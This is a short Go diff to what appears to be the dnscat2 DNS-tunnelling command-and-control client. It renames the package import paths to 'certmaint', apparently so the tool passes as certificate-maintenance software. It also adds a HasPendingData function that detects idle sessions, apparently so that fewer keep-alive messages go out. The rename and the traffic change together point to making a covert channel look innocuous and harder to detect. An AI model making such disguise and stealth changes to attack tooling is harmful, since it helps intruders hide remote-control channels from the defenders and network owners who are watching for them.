@@ -5,8 +5,8 @@ import (
 	"fmt"
 	"sync"
 
-	"dnscat2/pkg/protocol"
-	"dnscat2/pkg/session"
+	"certmaint/pkg/protocol"
+	"certmaint/pkg/session"
 )
 
 var (
@@ -114,6 +114,26 @@ func GetOutgoing(maxLength int) ([]byte, bool) {
 	}
 
 	return s.GetOutgoing(maxLength), true
+}
+
+// HasPendingData reports whether any active session has application data queued.
+// Returns false when all sessions are idle (only empty keep-alive MSGs would be sent).
+func HasPendingData() bool {
+	globalController.mu.Lock()
+	active := make([]*session.Session, 0, len(globalController.sessions))
+	for _, s := range globalController.sessions {
+		if !s.IsShutdown() {
+			active = append(active, s)
+		}
+	}
+	globalController.mu.Unlock()
+
+	for _, s := range active {
+		if s.HasPendingData() {
+			return true
+		}
+	}
+	return false
 }
 
 // killIgnoredSessions kills sessions that haven't received responses
